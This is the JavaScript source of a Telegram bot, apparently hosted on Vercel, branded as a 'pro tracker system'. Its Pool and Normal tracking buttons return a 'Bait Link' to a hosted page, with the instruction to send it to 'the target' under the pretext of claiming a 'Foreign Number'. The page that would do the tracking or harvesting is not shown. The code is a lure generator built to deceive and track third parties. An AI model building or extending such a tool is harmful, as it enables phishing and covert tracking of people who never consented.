const { Telegraf, Markup } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);
const OWNER_ID = process.env.OWNER_ID;

bot.start((ctx) => {
    const mainMenu = Markup.inlineKeyboard([
        [Markup.button.callback('🎱 Pool Tracking', 'gen_pool')],
        [Markup.button.callback('⚡ Normal Tracking', 'gen_normal')],
        [Markup.button.callback('developer Mr Dev',)],
        [Markup.button.url('🌐 Bot Support', 'https://t.me/Mrddev')]
    ]);

    ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
        caption: "<b>🔱 PRO TRACKER SYSTEM v3.0</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\nSelect a mode to generate your tracking link:",
        parse_mode: 'HTML',
        ...mainMenu
    });
});

bot.action(['gen_pool', 'gen_normal'], async (ctx) => {
    const mode = ctx.match[0] === 'gen_pool' ? 'POOL' : 'NORMAL';
    const baitUrl = `https://${process.env.VERCEL_URL}/`; // Points to public/index.html

    ctx.editMessageCaption(`✅ <b>${mode} MODE ACTIVATED</b>\n\n` +
        `<b>Your Bait Link:</b>\n<code>${baitUrl}</code>\n\n` +
        `<i>Send this to the target to claim their "Foreign Number".</i>`, {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Back', 'back')]])
    });
});

bot.action('back', (ctx) => {
    // Re-show main menu
    ctx.editMessageCaption("<b>🔱 PRO TRACKER SYSTEM v3.0</b>", {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🎱 Pool Tracking', 'gen_pool')],
            [Markup.button.callback('⚡ Normal Tracking', 'gen_normal')]
        ])
    });
});

module.exports = async (req, res) => {
    if (req.method === 'POST') {
        await bot.handleUpdate(req.body);
        res.status(200).send('OK');
    } else {
        res.status(200).send('Bot is running...');
    }
};
